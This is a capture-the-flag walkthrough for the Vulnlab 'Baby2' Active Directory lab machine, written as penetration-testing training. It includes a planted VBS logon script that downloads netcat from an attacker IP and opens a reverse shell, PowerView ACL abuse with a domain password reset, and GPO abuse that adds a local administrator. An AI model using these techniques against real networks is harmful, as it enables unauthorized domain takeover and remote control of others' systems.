# Vulnlab - Baby2

```bash
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-09-08 10:27:13Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  tcpwrapped           
389/tcp   open  tcpwrapped
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.baby2.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.baby2.vl
| Issuer: commonName=baby2-CA
| Public Key type: rsa       
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-08-22T17:39:15
| Not valid after:  2024-08-21T17:39:15
| MD5:   86833092b739d099392a9fba548ca41d
|_SHA-1: 595b9978c2e36c712b4875ff45b40efc72657d3f
445/tcp   open  tcpwrapped           
3269/tcp  open  tcpwrapped
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.baby2.vl 
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.baby2.vl   
| Issuer: commonName=baby2-CA                                     
| Public Key type: rsa            
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-08-22T17:39:15
| Not valid after:  2024-08-21T17:39:15
| MD5:   86833092b739d099392a9fba548ca41d
|_SHA-1: 595b9978c2e36c712b4875ff45b40efc72657d3f
3389/tcp  open  tcpwrapped
| ssl-cert: Subject: commonName=dc.baby2.vl
```

Enumerating smb shares with null authentication

<img src="https://i.imgur.com/iwh9V3j.png"/>
From `homes` share, we can find some directories for users

<img src="https://i.imgur.com/rCHltWz.png"/>

Also from `apps` share there's `login.vbs.lnk`

<img src="https://i.imgur.com/U86Xlkn.png"/>

With kerbrute we can verify these users also check if pre-authentication is disabled for AS-REP roasting

<img src="https://i.imgur.com/CCnOfDi.png"/>
From `NETLOGON` there's the login.vbs but it doesn't really seemed useful

<img src="https://i.imgur.com/YHBmO9k.png"/>

# Foothold (Amelia)

From the users, there's library which seems odd, on trying to login with the password `library` it shows that's a valid login

<img src="https://i.imgur.com/geyjqwp.png"/>

This user has READ access on SYSVOL share

<img src="https://i.imgur.com/iferM0F.png"/>

Also running bloodhound to enumerate domain

```bash
python3 /opt/BloodHound.py/bloodhound.py -d 'baby2.vl' -u 'library' -p 'library' -c all -ns 10.10.105.23
```

<img src="https://i.imgur.com/Y8HWO8w.png"/>

This user didn't had any ACLs but running the `shortest path to high value targets` ,  members of `LEGACY` group has `WriteDacl` on `GPOADM` which further has `GenericAll` on `Group Policy Object (GPO)`

<img src="https://i.imgur.com/s5P6q4Q.png"/>

But for now we need to focus on logon script, even tho from the output of crackmapexec, it showed that we only have READ access on SYSVOL, we can still overwrite the login.vbs file from scripts folder, just point the network share to our IP

<img src="https://i.imgur.com/6rvCTqy.png"/>

Have responder or smbserver ready and upload the file 

<img src="https://i.imgur.com/dQa7HVg.png"/>

On responder, we'll receive the NTLMv1 hash of `Amelia`

<img src="https://i.imgur.com/wwMsSh2.png"/>
But I wasn't able to crack this hash, instead we can just modify the vbs script to get a reverse shell

```vb
 Set oShell = CreateObject("Wscript.Shell")
 oShell.run "cmd.exe /c curl 10.8.0.136/nc64.exe -o C:\Windows\Temp\nc64.exe"
oShell.run "cmd.exe /c C:\Windows\Temp\nc64.exe 10.8.0.136 2222 -e cmd.exe"
```

<img src="https://i.imgur.com/dzHBcYj.png"/>

<img src="https://i.imgur.com/I37QCPk.png"/>

Check in which groups amelia belongs to 

<img src="https://i.imgur.com/19T5Ed8.png"/>

This account is a member of legacy group, meaning that we can abuse WriteDACL on GPOADM, with `PowerView` granting GenericAll on GPOADM

```bash
Add-DomainObjectAcl -Rights 'All' -TargetIdentity "GPOADM" -PrincipalIdentity "Amelia.Griffiths" -Verbose
```

<img src="https://i.imgur.com/ER8RoPp.png"/>
Now we can change the password for GPOADM

```powershell
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity GPOADM -AccountPassword $UserPassword
```

<img src="https://i.imgur.com/1BdrGsj.png"/>
<img src="https://i.imgur.com/sD0oITq.png"/>

Using pyGPOAbuse https://github.com/Hackndo/pyGPOAbuse, we can create immediate scheduled task which will get executed as SYSTEM user to add GPOADM in local administrators group (for this I had to use python virtual environment as some dependencies were causing an issue with the current impacket version), we'll need the GPO ID for creating the task

<img src="https://i.imgur.com/6LMSME5.png"/>

```bash
 python3 pygpoabuse.py baby2.vl/GPOADM:'Password123!' -gpo-id "31B2F340-016D-11D2-945F-00C04FB984F9" -command 'net localgroup administrators GPOADM /add' -f
```

<img src="https://i.imgur.com/YYjC6iJ.png"/>

Wait for few seconds for the created task to be executed, we'll see GPOADM being a part of administrators group

<img src="https://i.imgur.com/3Ey6wZN.png"/>

Now we can login through WinRM

<img src="https://i.imgur.com/P5rnhWd.png"/>

# References

- https://github.com/Hackndo/pyGPOAbuse
- https://www.thehacker.recipes/ad/movement/group-policies
